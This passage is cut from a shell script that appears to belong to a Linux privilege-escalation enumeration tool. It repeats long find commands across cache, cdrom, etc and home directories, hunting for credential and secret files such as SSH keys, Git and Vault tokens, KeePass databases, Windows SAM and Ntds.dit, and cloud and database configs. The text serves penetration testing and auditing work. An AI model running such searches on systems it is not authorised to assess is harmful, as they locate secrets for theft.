\"atlantis.db\" -o -name \"protecteduserkey.bin\" -o -name \"*.swp\" -o -name \"snyk.config.json\" -o -name \"my.ini\" -o -name \"crio.sock\" -o -name \"winscp.ini\" -o -name \".bashrc\" -o -name \"bash.exe\" -o -name \"software\" -o -name \"*.key\" -o -name \"KeePass.enforced*\" -o -name \"passwd\" -o -name \"*.rdg\" -o -name \"*vnc*.ini\" -o -name \"TokenCache.dat\" -o -name \"drives.xml\" -o -name \"mosquitto.conf\" -o -name \"security.sav\" -o -name \"password*.ibd\" -o -name \".secrets.mkey\" -o -name \"unattended.xml\" -o -name \"backups\" -o -name \"Dockerfile\" -o -name \"system.sav\" -o -name \"passwd.ibd\" -o -name \"*.tfstate\" -o -name \"rsyncd.secrets\" -o -name \"pgadmin4.db\" -o -name \"redis.conf\" -o -name \"SYSTEM\" -o -name \"web*.config\" -o -name \"vault-ssh-helper.hcl\" -o -name \"setupinfo.bak\" -o -name \"unattend.inf\" -o -name \"scheduledtasks.xml\" -o -name \"secrets.ldb\" -o -name \"wp-config.php\" -o -name \"database.php\" -o -name \"*.db\" -o -name \"*credential*\" -o -name \"*.keyring\" -o -name \"kadm5.acl\" -o -name \"racoon.conf\" -o -name \"sysprep.xml\" -o -name \"*.vhdx\" -o -name \"accessTokens.json\" -o -name \"plum.sqlite\" -o -name \".pypirc\" -o -name \"config.php\" -o -name \"sites.ini\" -o -name \"ntuser.dat\" -o -name \"hudson.util.Secret\" -o -name \"sssd.conf\" -o -name \"log4j-core*.jar\" -o -name \".boto\" -o -name \"sentry.conf.py\" -o -name \".recently-used.xbel\" -o -name \".vault-token\" -o -name \"settings.php\" -o -name \"php.ini\" -o -name \"hosts.equiv\" -o -name \"glusterfs.pem\" -o -name \"autologin.conf\" -o -name \".profile\" -o -name \"ConsoleHost_history.txt\" -o -name \"rpcd\" -o -name \"docker.socket\" -o -name \"mysqld.cnf\" -o -name \"postgresql.conf\" -o -name \"airflow.cfg\" -o -name \".Xauthority\" -o -name \"webserver_config.py\" -o -name \"setupinfo\" -o -name \".google_authenticator\" -o -name \"NetSetup.log\" -o -name \"*.tf\" -o -name \".git-credentials\" -o -name \"rktlet.sock\" -o -name \"*.gpg\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_CACHE=`eval_bckgrd "find ${ROOT_FOLDER}.cache -name \"storage.php\" -o -name \"firebase-tools.json\" -o -name \".credentials.json\" -o -name \"jetty-realm.properties\" -o -name \"*.service\" -o -name \".github\" -o -name \"adc.json\" -o -name \".erlang.cookie\" -o -name \"id_rsa*\" -o -name \"*.pem\" -o -name \".plan\" -o -name \"hostapd.conf\" -o -name \"docker.sock\" -o -name \"recentservers.xml\" -o -name \"master.key\" -o -name \"ftp.config\" -o -name \"zabbix_server.conf\" -o -name \"containerd.sock\" -o -name \"*.keystore\" -o -name \"RDCMan.settings\" -o -name \"index.dat\" -o -name \"secrets.yml\" -o -name \".env*\" -o -name \"https.conf\" -o -name \"SecEvent.Evt\" -o -name \"KeePass.config*\" -o -name \".ldaprc\" -o -name \"nginx.conf\" -o -name \".rhosts\" -o -name \"*vnc*.c*nf*\" -o -name \"authorized_hosts\" -o -name \"*.socket\" -o -name \"ftp.ini\" -o -name \"mongod*.conf\" -o -name \"my.cnf\" -o -name \"creds*\" -o -name \"access_tokens.db\" -o -name \"*.sqlite\" -o -name \"api_key\" -o -name \"fastcgi_params\" -o -name \"*.p12\" -o -name \"sitemanager.xml\" -o -name \"*.csr\" -o -name \"KeePass.ini\" -o -name \"unattend.txt\" -o -name \"fat.config\" -o -name \"*.vhd\" -o -name \"*.timer\" -o -name \"elasticsearch.y*ml\" -o -name \"ipsec.secrets\" -o -name \"*.ftpconfig\" -o -name \"*password*\" -o -name \"printers.xml\" -o -name \"wsl.exe\" -o -name \"*.crt\" -o -name \"db.php\" -o -name \"*.pfx\" -o -name \"grafana.ini\" -o -name \"mariadb.cnf\" -o -name \"*.psk\" -o -name \"kcpassword\" -o -name \"pgsql.conf\" -o -name \"access.log\" -o -name \"AppEvent.Evt\" -o -name \".htpasswd\" -o -name \"*.der\" -o -name \"config.xml\" -o -name \".wgetrc\" -o -name \"filezilla.xml\" -o -name \"*.pub\" -o -name \"*.pgp\" -o -name \"FreePBX.conf\" -o -name \".msmtprc\" -o -name \"wcx_ftp.ini\" -o -name \"autounattend.xml\" -o -name \"bitcoin.conf\" -o -name \"iis6.log\" -o -name \"000-default.conf\" -o -name \".lesshst\" -o -name \"pgadmin*.db\" -o -name \"pg_hba.conf\" -o -name \"*.sqlite3\" -o -name \"server.xml\" -o -name \"influxdb.conf\" -o -name \"vsftpd.conf\" -o -name \"pagefile.sys\" -o -name \"unattend.xml\" -o -name \"*.kdbx\" -o -name \"id_dsa*\" -o -name \".sudo_as_admin_successful\" -o -name \"groups.xml\" -o -name \"*config*.php\" -o -name \"*_history*\" -o -name \"ws_ftp.ini\" -o -name \"Elastix.conf\" -o -name \"https-xampp.conf\" -o -name \"psk.txt\" -o -name \"Ntds.dit\" -o -name \"*.vmdk\" -o -name \"appcmd.exe\" -o -name \"*.cer\" -o -name \"amportal.conf\" -o -name \"error.log\" -o -name \"ffftp.ini\" -o -name \"*.gnupg\" -o -name \"smb.conf\" -o -name \"rsyncd.conf\" -o -name \"software.sav\" -o -name \"sysprep.inf\" -o -name \"default.sav\" -o -name \"FreeSSHDservice.ini\" -o -name \".roadtools_auth\" -o -name \"rocketchat.service\" -o -name \"snmpd.conf\" -o -name \"snyk.json\" -o -name \"scclient.exe\" -o -name \"gvm-tools.conf\" -o -name \"gitlab.yml\" -o -name \"dockershim.sock\" -o -name \"kibana.y*ml\" -o -name \"SAM\" -o -name \"tomcat-users.xml\" -o -name \".k5login\" -o -name \"*.jks\" -o -name \"cloud.cfg\" -o -name \"docker-compose.yml\" -o -name \"*.ovpn\" -o -name \"glusterfs.ca\" -o -name \"azureProfile.json\" -o -name \".gitconfig\" -o -name \"legacy_credentials.db\" -o -name \"pwd.ibd\" -o -name \"debian.cnf\" -o -name \"gitlab.rm\" -o -name \"ddclient.conf\" -o -name \"*.keytab\" -o -name \"credentials.xml\" -o -name \".git\" -o -name \"glusterfs.key\" -o -name \"krb5.conf\" -o -name \"httpd.conf\" -o -name \"AzureRMContext.json\" -o -name \"cesi.conf\" -o -name \"*vnc*.xml\" -o -name \"authorized_keys\" -o -name \"passbolt.php\" -o -name \"anaconda-ks.cfg\" -o -name \"sip.conf\" -o -name \"*.viminfo\" -o -name \".flyrc\" -o -name \"autologin\" -o -name \"credentials.db\" -o -name \"krb5cc_*\" -o -name \"frakti.sock\" -o -name \"zabbix_agentd.conf\" -o -name \"supervisord.conf\" -o -name \"known_hosts\" -o -name \"datasources.xml\" -o -name \"*vnc*.txt\" -o -name \"access_tokens.json\" -o -name \"backup\" -o -name \"ipsec.conf\" -o -name \"atlantis.db\" -o -name \"protecteduserkey.bin\" -o -name \"*.swp\" -o -name \"snyk.config.json\" -o -name \"my.ini\" -o -name \"crio.sock\" -o -name \"winscp.ini\" -o -name \".bashrc\" -o -name \"bash.exe\" -o -name \"software\" -o -name \"*.key\" -o -name \"KeePass.enforced*\" -o -name \"passwd\" -o -name \"*.rdg\" -o -name \"*vnc*.ini\" -o -name \"TokenCache.dat\" -o -name \"drives.xml\" -o -name \"mosquitto.conf\" -o -name \"security.sav\" -o -name \"password*.ibd\" -o -name \".secrets.mkey\" -o -name \"unattended.xml\" -o -name \"backups\" -o -name \"Dockerfile\" -o -name \"system.sav\" -o -name \"passwd.ibd\" -o -name \"*.tfstate\" -o -name \"rsyncd.secrets\" -o -name \"pgadmin4.db\" -o -name \"redis.conf\" -o -name \"SYSTEM\" -o -name \"web*.config\" -o -name \"vault-ssh-helper.hcl\" -o -name \"setupinfo.bak\" -o -name \"unattend.inf\" -o -name \"scheduledtasks.xml\" -o -name \"secrets.ldb\" -o -name \"wp-config.php\" -o -name \"database.php\" -o -name \"*.db\" -o -name \"*credential*\" -o -name \"*.keyring\" -o -name \"kadm5.acl\" -o -name \"racoon.conf\" -o -name \"sysprep.xml\" -o -name \"*.vhdx\" -o -name \"accessTokens.json\" -o -name \"plum.sqlite\" -o -name \".pypirc\" -o -name \"config.php\" -o -name \"sites.ini\" -o -name \"ntuser.dat\" -o -name \"hudson.util.Secret\" -o -name \"sssd.conf\" -o -name \"log4j-core*.jar\" -o -name \".boto\" -o -name \"sentry.conf.py\" -o -name \".recently-used.xbel\" -o -name \".vault-token\" -o -name \"settings.php\" -o -name \"php.ini\" -o -name \"hosts.equiv\" -o -name \"glusterfs.pem\" -o -name \"autologin.conf\" -o -name \".profile\" -o -name \"ConsoleHost_history.txt\" -o -name \"rpcd\" -o -name \"docker.socket\" -o -name \"mysqld.cnf\" -o -name \"postgresql.conf\" -o -name \"airflow.cfg\" -o -name \".Xauthority\" -o -name \"webserver_config.py\" -o -name \"setupinfo\" -o -name \".google_authenticator\" -o -name \"NetSetup.log\" -o -name \"*.tf\" -o -name \".git-credentials\" -o -name \"rktlet.sock\" -o -name \"*.gpg\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_CDROM=`eval_bckgrd "find ${ROOT_FOLDER}cdrom -name \"storage.php\" -o -name \"firebase-tools.json\" -o -name \".credentials.json\" -o -name \"jetty-realm.properties\" -o -name \"*.service\" -o -name \".github\" -o -name \"adc.json\" -o -name \".erlang.cookie\" -o -name \"id_rsa*\" -o -name \"*.pem\" -o -name \".plan\" -o -name \"hostapd.conf\" -o -name \"docker.sock\" -o -name \"recentservers.xml\" -o -name \"master.key\" -o -name \"ftp.config\" -o -name \"zabbix_server.conf\" -o -name \"containerd.sock\" -o -name \"*.keystore\" -o -name \"RDCMan.settings\" -o -name \"index.dat\" -o -name \"secrets.yml\" -o -name \".env*\" -o -name \"https.conf\" -o -name \"SecEvent.Evt\" -o -name \"KeePass.config*\" -o -name \".ldaprc\" -o -name \"nginx.conf\" -o -name \".rhosts\" -o -name \"*vnc*.c*nf*\" -o -name \"authorized_hosts\" -o -name \"*.socket\" -o -name \"ftp.ini\" -o -name \"mongod*.conf\" -o -name \"my.cnf\" -o -name \"creds*\" -o -name \"access_tokens.db\" -o -name \"*.sqlite\" -o -name \"api_key\" -o -name \"fastcgi_params\" -o -name \"*.p12\" -o -name \"sitemanager.xml\" -o -name \"*.csr\" -o -name \"KeePass.ini\" -o -name \"unattend.txt\" -o -name \"fat.config\" -o -name \"*.vhd\" -o -name \"*.timer\" -o -name \"elasticsearch.y*ml\" -o -name \"ipsec.secrets\" -o -name \"*.ftpconfig\" -o -name \"*password*\" -o -name \"printers.xml\" -o -name \"wsl.exe\" -o -name \"*.crt\" -o -name \"db.php\" -o -name \"*.pfx\" -o -name \"grafana.ini\" -o -name \"mariadb.cnf\" -o -name \"*.psk\" -o -name \"kcpassword\" -o -name \"pgsql.conf\" -o -name \"access.log\" -o -name \"AppEvent.Evt\" -o -name \".htpasswd\" -o -name \"*.der\" -o -name \"config.xml\" -o -name \".wgetrc\" -o -name \"filezilla.xml\" -o -name \"*.pub\" -o -name \"*.pgp\" -o -name \"FreePBX.conf\" -o -name \".msmtprc\" -o -name \"wcx_ftp.ini\" -o -name \"autounattend.xml\" -o -name \"bitcoin.conf\" -o -name \"iis6.log\" -o -name \"000-default.conf\" -o -name \".lesshst\" -o -name \"pgadmin*.db\" -o -name \"pg_hba.conf\" -o -name \"*.sqlite3\" -o -name \"server.xml\" -o -name \"influxdb.conf\" -o -name \"vsftpd.conf\" -o -name \"pagefile.sys\" -o -name \"unattend.xml\" -o -name \"*.kdbx\" -o -name \"id_dsa*\" -o -name \".sudo_as_admin_successful\" -o -name \"groups.xml\" -o -name \"*config*.php\" -o -name \"*_history*\" -o -name \"ws_ftp.ini\" -o -name \"Elastix.conf\" -o -name \"https-xampp.conf\" -o -name \"psk.txt\" -o -name \"Ntds.dit\" -o -name \"*.vmdk\" -o -name \"appcmd.exe\" -o -name \"*.cer\" -o -name \"amportal.conf\" -o -name \"error.log\" -o -name \"ffftp.ini\" -o -name \"*.gnupg\" -o -name \"smb.conf\" -o -name \"rsyncd.conf\" -o -name \"software.sav\" -o -name \"sysprep.inf\" -o -name \"default.sav\" -o -name \"FreeSSHDservice.ini\" -o -name \".roadtools_auth\" -o -name \"rocketchat.service\" -o -name \"snmpd.conf\" -o -name \"snyk.json\" -o -name \"scclient.exe\" -o -name \"gvm-tools.conf\" -o -name \"gitlab.yml\" -o -name \"dockershim.sock\" -o -name \"kibana.y*ml\" -o -name \"SAM\" -o -name \"tomcat-users.xml\" -o -name \".k5login\" -o -name \"*.jks\" -o -name \"cloud.cfg\" -o -name \"docker-compose.yml\" -o -name \"*.ovpn\" -o -name \"glusterfs.ca\" -o -name \"azureProfile.json\" -o -name \".gitconfig\" -o -name \"legacy_credentials.db\" -o -name \"pwd.ibd\" -o -name \"debian.cnf\" -o -name \"gitlab.rm\" -o -name \"ddclient.conf\" -o -name \"*.keytab\" -o -name \"credentials.xml\" -o -name \".git\" -o -name \"glusterfs.key\" -o -name \"krb5.conf\" -o -name \"httpd.conf\" -o -name \"AzureRMContext.json\" -o -name \"cesi.conf\" -o -name \"*vnc*.xml\" -o -name \"authorized_keys\" -o -name \"passbolt.php\" -o -name \"anaconda-ks.cfg\" -o -name \"sip.conf\" -o -name \"*.viminfo\" -o -name \".flyrc\" -o -name \"autologin\" -o -name \"credentials.db\" -o -name \"krb5cc_*\" -o -name \"frakti.sock\" -o -name \"zabbix_agentd.conf\" -o -name \"supervisord.conf\" -o -name \"known_hosts\" -o -name \"datasources.xml\" -o -name \"*vnc*.txt\" -o -name \"access_tokens.json\" -o -name \"backup\" -o -name \"ipsec.conf\" -o -name \"atlantis.db\" -o -name \"protecteduserkey.bin\" -o -name \"*.swp\" -o -name \"snyk.config.json\" -o -name \"my.ini\" -o -name \"crio.sock\" -o -name \"winscp.ini\" -o -name \".bashrc\" -o -name \"bash.exe\" -o -name \"software\" -o -name \"*.key\" -o -name \"KeePass.enforced*\" -o -name \"passwd\" -o -name \"*.rdg\" -o -name \"*vnc*.ini\" -o -name \"TokenCache.dat\" -o -name \"drives.xml\" -o -name \"mosquitto.conf\" -o -name \"security.sav\" -o -name \"password*.ibd\" -o -name \".secrets.mkey\" -o -name \"unattended.xml\" -o -name \"backups\" -o -name \"Dockerfile\" -o -name \"system.sav\" -o -name \"passwd.ibd\" -o -name \"*.tfstate\" -o -name \"rsyncd.secrets\" -o -name \"pgadmin4.db\" -o -name \"redis.conf\" -o -name \"SYSTEM\" -o -name \"web*.config\" -o -name \"vault-ssh-helper.hcl\" -o -name \"setupinfo.bak\" -o -name \"unattend.inf\" -o -name \"scheduledtasks.xml\" -o -name \"secrets.ldb\" -o -name \"wp-config.php\" -o -name \"database.php\" -o -name \"*.db\" -o -name \"*credential*\" -o -name \"*.keyring\" -o -name \"kadm5.acl\" -o -name \"racoon.conf\" -o -name \"sysprep.xml\" -o -name \"*.vhdx\" -o -name \"accessTokens.json\" -o -name \"plum.sqlite\" -o -name \".pypirc\" -o -name \"config.php\" -o -name \"sites.ini\" -o -name \"ntuser.dat\" -o -name \"hudson.util.Secret\" -o -name \"sssd.conf\" -o -name \"log4j-core*.jar\" -o -name \".boto\" -o -name \"sentry.conf.py\" -o -name \".recently-used.xbel\" -o -name \".vault-token\" -o -name \"settings.php\" -o -name \"php.ini\" -o -name \"hosts.equiv\" -o -name \"glusterfs.pem\" -o -name \"autologin.conf\" -o -name \".profile\" -o -name \"ConsoleHost_history.txt\" -o -name \"rpcd\" -o -name \"docker.socket\" -o -name \"mysqld.cnf\" -o -name \"postgresql.conf\" -o -name \"airflow.cfg\" -o -name \".Xauthority\" -o -name \"webserver_config.py\" -o -name \"setupinfo\" -o -name \".google_authenticator\" -o -name \"NetSetup.log\" -o -name \"*.tf\" -o -name \".git-credentials\" -o -name \"rktlet.sock\" -o -name \"*.gpg\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_ETC=`eval_bckgrd "find ${ROOT_FOLDER}etc -name \"storage.php\" -o -name \"firebase-tools.json\" -o -name \".credentials.json\" -o -name \"jetty-realm.properties\" -o -name \"*.service\" -o -name \".github\" -o -name \"adc.json\" -o -name \".erlang.cookie\" -o -name \"id_rsa*\" -o -name \"*.pem\" -o -name \".plan\" -o -name \"hostapd.conf\" -o -name \"docker.sock\" -o -name \"recentservers.xml\" -o -name \"master.key\" -o -name \"ftp.config\" -o -name \"zabbix_server.conf\" -o -name \"containerd.sock\" -o -name \"*.keystore\" -o -name \"RDCMan.settings\" -o -name \"index.dat\" -o -name \"secrets.yml\" -o -name \".env*\" -o -name \"https.conf\" -o -name \"SecEvent.Evt\" -o -name \"KeePass.config*\" -o -name \".ldaprc\" -o -name \"nginx.conf\" -o -name \".rhosts\" -o -name \"*vnc*.c*nf*\" -o -name \"authorized_hosts\" -o -name \"*.socket\" -o -name \"ftp.ini\" -o -name \"mongod*.conf\" -o -name \"my.cnf\" -o -name \"creds*\" -o -name \"access_tokens.db\" -o -name \"*.sqlite\" -o -name \"api_key\" -o -name \"fastcgi_params\" -o -name \"*.p12\" -o -name \"sitemanager.xml\" -o -name \"*.csr\" -o -name \"KeePass.ini\" -o -name \"unattend.txt\" -o -name \"fat.config\" -o -name \"*.vhd\" -o -name \"*.timer\" -o -name \"elasticsearch.y*ml\" -o -name \"ipsec.secrets\" -o -name \"*.ftpconfig\" -o -name \"*password*\" -o -name \"printers.xml\" -o -name \"wsl.exe\" -o -name \"*.crt\" -o -name \"db.php\" -o -name \"*.pfx\" -o -name \"grafana.ini\" -o -name \"mariadb.cnf\" -o -name \"*.psk\" -o -name \"kcpassword\" -o -name \"pgsql.conf\" -o -name \"access.log\" -o -name \"AppEvent.Evt\" -o -name \".htpasswd\" -o -name \"*.der\" -o -name \"config.xml\" -o -name \".wgetrc\" -o -name \"filezilla.xml\" -o -name \"*.pub\" -o -name \"*.pgp\" -o -name \"FreePBX.conf\" -o -name \".msmtprc\" -o -name \"wcx_ftp.ini\" -o -name \"autounattend.xml\" -o -name \"bitcoin.conf\" -o -name \"iis6.log\" -o -name \"000-default.conf\" -o -name \".lesshst\" -o -name \"pgadmin*.db\" -o -name \"pg_hba.conf\" -o -name \"*.sqlite3\" -o -name \"server.xml\" -o -name \"influxdb.conf\" -o -name \"vsftpd.conf\" -o -name \"pagefile.sys\" -o -name \"unattend.xml\" -o -name \"*.kdbx\" -o -name \"id_dsa*\" -o -name \".sudo_as_admin_successful\" -o -name \"groups.xml\" -o -name \"*config*.php\" -o -name \"*_history*\" -o -name \"ws_ftp.ini\" -o -name \"*knockd*\" -o -name \"Elastix.conf\" -o -name \"https-xampp.conf\" -o -name \"psk.txt\" -o -name \"Ntds.dit\" -o -name \"*.vmdk\" -o -name \"appcmd.exe\" -o -name \"*.cer\" -o -name \"amportal.conf\" -o -name \"error.log\" -o -name \"ffftp.ini\" -o -name \"*.gnupg\" -o -name \"smb.conf\" -o -name \"rsyncd.conf\" -o -name \"software.sav\" -o -name \"sysprep.inf\" -o -name \"default.sav\" -o -name \"FreeSSHDservice.ini\" -o -name \".roadtools_auth\" -o -name \"rocketchat.service\" -o -name \"snmpd.conf\" -o -name \"snyk.json\" -o -name \"scclient.exe\" -o -name \"gvm-tools.conf\" -o -name \"gitlab.yml\" -o -name \"dockershim.sock\" -o -name \"kibana.y*ml\" -o -name \"SAM\" -o -name \"tomcat-users.xml\" -o -name \".k5login\" -o -name \"*.jks\" -o -name \"cloud.cfg\" -o -name \"docker-compose.yml\" -o -name \"*.ovpn\" -o -name \"glusterfs.ca\" -o -name \"azureProfile.json\" -o -name \".gitconfig\" -o -name \"legacy_credentials.db\" -o -name \"pwd.ibd\" -o -name \"debian.cnf\" -o -name \"gitlab.rm\" -o -name \"ddclient.conf\" -o -name \"*.keytab\" -o -name \"credentials.xml\" -o -name \".git\" -o -name \"glusterfs.key\" -o -name \"krb5.conf\" -o -name \"httpd.conf\" -o -name \"AzureRMContext.json\" -o -name \"cesi.conf\" -o -name \"*vnc*.xml\" -o -name \"authorized_keys\" -o -name \"passbolt.php\" -o -name \"anaconda-ks.cfg\" -o -name \"sip.conf\" -o -name \"*.viminfo\" -o -name \".flyrc\" -o -name \"autologin\" -o -name \"credentials.db\" -o -name \"krb5cc_*\" -o -name \"frakti.sock\" -o -name \"zabbix_agentd.conf\" -o -name \"supervisord.conf\" -o -name \"known_hosts\" -o -name \"datasources.xml\" -o -name \"*vnc*.txt\" -o -name \"access_tokens.json\" -o -name \"backup\" -o -name \"ipsec.conf\" -o -name \"atlantis.db\" -o -name \"protecteduserkey.bin\" -o -name \"*.swp\" -o -name \"snyk.config.json\" -o -name \"my.ini\" -o -name \"crio.sock\" -o -name \"winscp.ini\" -o -name \".bashrc\" -o -name \"bash.exe\" -o -name \"software\" -o -name \"*.key\" -o -name \"KeePass.enforced*\" -o -name \"passwd\" -o -name \"*.rdg\" -o -name \"*vnc*.ini\" -o -name \"TokenCache.dat\" -o -name \"drives.xml\" -o -name \"mosquitto.conf\" -o -name \"security.sav\" -o -name \"password*.ibd\" -o -name \".secrets.mkey\" -o -name \"unattended.xml\" -o -name \"backups\" -o -name \"Dockerfile\" -o -name \"system.sav\" -o -name \"passwd.ibd\" -o -name \"*.tfstate\" -o -name \"rsyncd.secrets\" -o -name \"pgadmin4.db\" -o -name \"redis.conf\" -o -name \"SYSTEM\" -o -name \"web*.config\" -o -name \"vault-ssh-helper.hcl\" -o -name \"setupinfo.bak\" -o -name \"unattend.inf\" -o -name \"scheduledtasks.xml\" -o -name \"secrets.ldb\" -o -name \"wp-config.php\" -o -name \"database.php\" -o -name \"*.db\" -o -name \"*credential*\" -o -name \"*.keyring\" -o -name \"kadm5.acl\" -o -name \"racoon.conf\" -o -name \"sysprep.xml\" -o -name \"*.vhdx\" -o -name \"accessTokens.json\" -o -name \"plum.sqlite\" -o -name \".pypirc\" -o -name \"config.php\" -o -name \"sites.ini\" -o -name \"exports\" -o -name \"ntuser.dat\" -o -name \"hudson.util.Secret\" -o -name \"sssd.conf\" -o -name \"log4j-core*.jar\" -o -name \".boto\" -o -name \"sentry.conf.py\" -o -name \".recently-used.xbel\" -o -name \".vault-token\" -o -name \"settings.php\" -o -name \"php.ini\" -o -name \"hosts.equiv\" -o -name \"glusterfs.pem\" -o -name \"autologin.conf\" -o -name \".profile\" -o -name \"ConsoleHost_history.txt\" -o -name \"rpcd\" -o -name \"docker.socket\" -o -name \"mysqld.cnf\" -o -name \"postgresql.conf\" -o -name \"airflow.cfg\" -o -name \".Xauthority\" -o -name \"webserver_config.py\" -o -name \"setupinfo\" -o -name \".google_authenticator\" -o -name \"NetSetup.log\" -o -name \"*.tf\" -o -name \".git-credentials\" -o -name \"rktlet.sock\" -o -name \"*.gpg\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_HOMESEARCH=`eval_bckgrd "find $HOMESEARCH -name \"storage.php\" -o -name \"firebase-tools.json\" -o -name \".credentials.json\" -o -name \"jetty-realm.properties\" -o -name \"*.service\" -o -name \".github\" -o -name \"adc.json\" -o -name \".erlang.cookie\" -o -name \"id_rsa*\" -o -name \"*.pem\" -o -name \".plan\" -o -name \"hostapd.conf\" -o -name \"docker.sock\" -o -name \"recentservers.xml\" -o -name \"master.key\" -o -name \"ftp.config\" -o -name \"zabbix_server.conf\" -o -name \"containerd.sock\" -o -name \"*.keystore\" -o -name \"RDCMan.settings\" -o -name \"index.dat\" -o -name \"secrets.yml\" -o -name \".env*\" -o -name \"https.conf\" -o -name \"SecEvent.Evt\" -o -name \"KeePass.config*\" -o -name \".ldaprc\" -o -name \"nginx.conf\" -o -name \".rhosts\" -o -name \"*vnc*.c*nf*\" -o -name \"authorized_hosts\" -o -name \"*.socket\" -o -name \"ftp.ini\" -o -name \"mongod*.conf\" -o -name \"ssh*config\" -o -name \"my.cnf\" -o -name \"creds*\" -o -name \"access_tokens.db\" -o -name \"*.sqlite\" -o -name \"api_key\" -o -name \"fastcgi_params\" -o -name \"*.p12\" -o -name \"sitemanager.xml\" -o -name \"*.csr\" -o -name \"KeePass.ini\" -o -name \"unattend.txt\" -o -name \"fat.config\" -o -name \"*.vhd\" -o -name \"*.timer\" -o -name \"elasticsearch.y*ml\" -o -name \"ipsec.secrets\" -o -name \"*.ftpconfig\" -o -name \"*password*\" -o -name \"printers.xml\" -o -name \"wsl.exe\" -o -name \"*.crt\" -o -name \"db.php\" -o -name \"*.pfx\" -o -name \"grafana.ini\" -o -name \"mariadb.cnf\" -o -name \"*.psk\" -o -name \"kcpassword\" -o -name \"pgsql.conf\" -o -name \"access.log\" -o -name \"AppEvent.Evt\" -o -name \".htpasswd\" -o -name \"*.der\" -o -name \"config.xml\" -o -name \".wgetrc\" -o -name \"filezilla.xml\" -o -name \"*.pub\" -o -name \"*.pgp\" -o -name \"FreePBX.conf\" -o -name \".msmtprc\" -o -name \"wcx_ftp.ini\" -o -name \"autounattend.xml\" -o -name \"bitcoin.conf\" -o -name \"iis6.log\" -o -name \"000-default.conf\" -o -name \".lesshst\" -o -name \"pgadmin*.db\" -o -name \"pg_hba.conf\" -o -name \"*.sqlite3\" -o -name \"server.xml\" -o -name \"influxdb.conf\" -o -name \"vsftpd.conf\" -o -name \"pagefile.sys\" -o -name \"unattend.xml\" -o -name \"*.kdbx\" -o -name \"id_dsa*\" -o -name \".sudo_as_admin_successful\" -o -name \"groups.xml\" -o -name \"*config*.php\" -o -name \"*_history*\" -o -name \"ws_ftp.ini\" -o -name \"Elastix.conf\" -o -name \"https-xampp.conf\" -o -name \"psk.txt\" -o -name \"Ntds.dit\" -o -name \"*.vmdk\" -o -name \"appcmd.exe\" -o -name \"*.cer\" -o -name \"amportal.conf\" -o -name \"error.log\" -o -name \"ffftp.ini\" -o -name \"*.gnupg\" -o -name \"smb.conf\" -o -name \"rsyncd.conf\" -o -name \"software.sav\" -o -name \"sysprep.inf\" -o -name \"default.sav\" -o -name \"FreeSSHDservice.ini\" -o -name \".roadtools_auth\" -o -name \"rocketchat.service\" -o -name \"snmpd.conf\" -o -name \"snyk.json\" -o -name \"scclient.exe\" -o -name \"gvm-tools.conf\" -o -name \"gitlab.yml\" -o -name \"dockershim.sock\" -o -name \"kibana.y*ml\" -o -name \"SAM\" -o -name \"tomcat-users.xml\" -o -name \".k5login\" -o -name \"*.jks\" -o -name \"cloud.cfg\" -o -name \"docker-compose.yml\" -o -name \"*.ovpn\" -o -name \"glusterfs.ca\" -o -name \"azureProfile.json\" -o -name \".gitconfig\" -o -name \"legacy_credentials.db\" -o -name \"pwd.ibd\" -o -name \"debian.cnf\" -o -name \"gitlab.rm\" -o -name \"ddclient.conf\" -o -name \"*.keytab\" -o -name \"credentials.xml\" -o -name \".git\" -o -name \"glusterfs.key\" -o -name \"krb5.conf\" -o -name \"httpd.conf\" -o -name \"AzureRMContext.json\" -o -name \"cesi.conf\" -o -name \"*vnc*.xml\" -o -name \"authorized_keys\" -o -name \"passbolt.php\" -o -name \"anaconda-ks.cfg\" -o -name \"sip.conf\" -o -name \"*.viminfo\" -o -name \".flyrc\" -o -name \"autologin\" -o -name \"credentials.db\" -o -name \"krb5cc_*\" -o -name \"frakti.sock\" -o -name \"zabbix_agentd.conf\" -o -name \"supervisord.conf\" -o -name \"known_hosts\" -o -name \"datasources.xml\" -o -name \"*vnc*.txt\" -o -name \"access_tokens.json\" -o -name \"backup\" -o -name \"ipsec.conf\" -o -name \"atlantis.db\" -o -name \"protecteduserkey.bin\" -o -name \"*.swp\" -o -name \"snyk.config.json\" -o -name \"my.ini\" -o -name \"crio.sock\" -o -name \"winscp.ini\" -o -name \".bashrc\" -o -name \"bash.exe\" -o -name \"software\" -o -name \"*.key\" -o -name \"KeePass.enforced*\" -o -name \"passwd\" -o -name \"*.rdg\" -o -name \"*vnc*.ini\" -o -name \"TokenCache.dat\" -o -name \"drives.xml\" -o -name \"mosquitto.conf\" -o -name \"security.sav\" -o -name \"password*.ibd\" -o -name \".secrets.mkey\" -o -name \"unattended.xml\" -o -name \"backups\" -o -name \"Dockerfile\" -o -name \"system.sav\" -o -name \"passwd.ibd\" -o -name \"*.tfstate\" -o -name \"rsyncd.secrets\" -o -name \"pgadmin4.db\" -o -name \"redis.conf\" -o -name \"SYSTEM\" -o -name \"web*.config\" -o -name \"vault-ssh-helper.hcl\" -o -name \"setupinfo.bak\" -o -name \"unattend.inf\" -o -name \"scheduledtasks.xml\" -o -name \"secrets.ldb\" -o -name \"wp-config.php\" -o -name \"database.php\" -o -name \"*.db\" -o -name \"*credential*\" -o -name \"*.keyring\" -o -name \"kadm5.acl\" -o -name \"racoon.conf\" -o -name \"sysprep.xml\" -o -name \"*.vhdx\" -o -name \"accessTokens.json\" -o -name \"plum.sqlite\" -o -name \".pypirc\" -o -name \"config.php\" -o -name \"sites.ini\" -o -name \"ntuser.dat\" -o -name \"hudson.util.Secret\" -o -name \"sssd.conf\" -o -name \"log4j-core*.jar\" -o -name \".boto\" -o -name \"sentry.conf.py\" -o -name \".recently-used.xbel\" -o -name \".vault-token\" -o -name \"settings.php\" -o -name \"php.ini\" -o -name \"hosts.equiv\" -o -name \"glusterfs.pem\" -o -name \"autologin.conf\" -o -name \".profile\" -o -name \"ConsoleHost_history.txt\" -o -name \"rpcd\" -o -name \"docker.socket\" -o -name \"mysqld.cnf\" -o -name \"postgresql.conf\" -o -name \"airflow.cfg\" -o -name \".Xauthority\" -o -name \"webserver_config.py\" -o -name \"setupinfo\" -o -name \".google_authenticator\" -o -name \"NetSetup.log\" -o -name \"*.tf\" -o -name \".git-credentials\" -o -name \"rktlet.sock\" -o -name 